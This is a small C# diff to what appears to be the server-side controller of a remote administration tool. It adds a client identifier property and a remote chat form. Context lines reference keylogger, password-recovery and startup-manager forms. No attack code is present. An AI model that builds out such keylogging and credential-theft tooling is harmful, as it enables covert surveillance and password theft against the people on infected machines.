@@ -14,6 +14,7 @@ namespace Serveur.Controllers.Server
         public string city { get; set; }
         public string id { get; set; }
         public string name { get; set; }
+        public string clientIdentifier { get; set; }
         public string countryWithCode { get { return string.Format("{0} [{1}]", country, countryCode); } }
         public string downloadDirectory { get; set; }
 
@@ -26,6 +27,7 @@ namespace Serveur.Controllers.Server
         public FrmStartupManager frmStm { get; set; }
         public FrmKeyLogger frmKl { get; set; }
         public FrmPasswordRecovery frmPr { get; set; }
+        public FrmRemoteChat frmRChat { get; set; }
 
         public bool receivedLastDirectory { get; set; }
 
